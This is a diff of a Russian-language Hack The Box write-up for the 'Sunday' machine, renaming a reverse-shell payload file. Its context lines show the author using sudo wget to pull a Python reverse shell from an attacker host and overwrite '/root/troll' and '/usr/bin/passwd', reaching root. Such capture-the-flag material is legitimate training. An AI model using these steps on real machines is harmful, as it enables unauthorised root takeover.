@@ -634,8 +634,8 @@ fb40fab6????????????????????????
 
 Начинается он как обычно — с подмены файла `/root/troll`, который, как мы помним, может быть запущен *sunny* с правами админа:
 ```text
-sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/sh3ll.py -O /root/troll
---11:10:06--  http://10.10.14.14:8881/sh3ll.py
+sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/.sh3ll.py -O /root/troll
+--11:10:06--  http://10.10.14.14:8881/.sh3ll.py
            => `/root/troll'
 Connecting to 10.10.14.14:8881... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -646,7 +646,7 @@ Length: 363 [application/octet-stream]
 11:10:06 (605.54 KB/s) - `/root/troll' saved [291/291]
 ```
 
-Загрузили мы, в свою очередь, этот питоновский reverse-shell (`sh3ll.py`, на скриншоте чуть ниже он назван `troll`):
+Загрузили мы, в свою очередь, этот питоновский reverse-shell (`.sh3ll.py`, на скриншоте чуть ниже он назван `troll`):
 ```python
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
@@ -738,8 +738,8 @@ sammy@sunday:~$ ls -la /usr/bin/rcp
 ```text
 sammy@sunday:~# cp /usr/bin/rcp /tmp/rcp.bak
 
-sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/sh3ll.py -O /usr/bin/passwd
---20:57:00--  http://10.10.14.14:8881/sh3ll.py
+sammy@sunday:~$ sudo /usr/bin/wget 10.10.14.14:8881/.sh3ll.py -O /usr/bin/passwd
+--20:57:00--  http://10.10.14.14:8881/.sh3ll.py
            => `/usr/bin/passwd'
 Connecting to 10.10.14.14:8881... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -835,7 +835,9 @@ root
 
 root@sunday:~# id
 uid=0(root) gid=0(root)
+```
 
+```text
 root@sunday:~# cat /root/root.txt
 fb40fab6????????????????????????
 ```
